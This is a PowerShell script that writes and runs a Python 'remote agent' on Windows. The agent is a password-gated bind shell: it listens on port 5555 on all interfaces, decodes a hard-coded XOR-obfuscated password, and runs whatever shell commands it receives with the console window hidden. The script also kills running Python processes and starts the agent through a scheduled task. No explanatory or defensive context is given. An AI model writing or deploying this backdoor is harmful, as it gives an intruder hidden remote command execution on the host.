$agentCode = @"
import socket
import subprocess
import threading
import base64

LISTEN_HOST = "0.0.0.0"
LISTEN_PORT = 5555
PASSWORD = "u can see me"
XOR_KEY = "key_xor_2026"

def xor_decrypt(enc_b64_str, key):
    try:
        raw_bytes = base64.b64decode(enc_b64_str.strip())
        key_bytes = key.encode('utf-8')
        decrypted = bytes([b ^ key_bytes[i % len(key_bytes)] for i, b in enumerate(raw_bytes)])
        return decrypted.decode('utf-8', errors='ignore')
    except Exception:
        return ""

def handle_client(conn, addr):
    try:
        conn.sendall(b"AUTH_REQUIRED\n")
        auth_data = conn.recv(1024).decode('utf-8', errors='ignore').strip()
        if xor_decrypt(auth_data, XOR_KEY) != PASSWORD:
            conn.sendall(b"AUTH_FAILED\n")
            conn.close()
            return
            
        conn.sendall(b"AUTH_OK\n")
        while True:
            cmd = conn.recv(4096).decode('utf-8', errors='ignore').strip()
            if not cmd or cmd.lower() in ["exit", "quit"]:
                break
            
            try:
                proc = subprocess.Popen(
                    cmd, shell=True, 
                    stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE,
                    creationflags=0x08000000
                )
                stdout, stderr = proc.communicate(timeout=10)
                output = stdout + stderr
                if not output:
                    output = b"[+] Command executed successfully.\n"
                conn.sendall(output)
            except subprocess.TimeoutExpired:
                proc.kill()
                conn.sendall(b"[!] Command timed out (took more than 10s) but might still be running.\n")
            except Exception as e:
                conn.sendall(f"[-] Command Error: {str(e)}\n".encode('utf-8'))
    except Exception:
        pass
    finally:
        conn.close()

def main():
    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    server.bind((LISTEN_HOST, LISTEN_PORT))
    server.listen(5)
    while True:
        conn, addr = server.accept()
        t = threading.Thread(target=handle_client, args=(conn, addr))
        t.daemon = True
        t.start()

if __name__ == "__main__":
    main()
"@

[System.IO.File]::WriteAllText("C:\RemoteAgent\agent.py", $agentCode, [System.Text.Encoding]::UTF8)

Stop-Process -Name "pythonw" -ErrorAction SilentlyContinue
Stop-Process -Name "python" -ErrorAction SilentlyContinue

Start-ScheduledTask -TaskName "RemoteAgent" -ErrorAction SilentlyContinue
if (-not $?) { Start-Process "C:\Program Files\Python312\pythonw.exe" "C:\RemoteAgent\agent.py" }
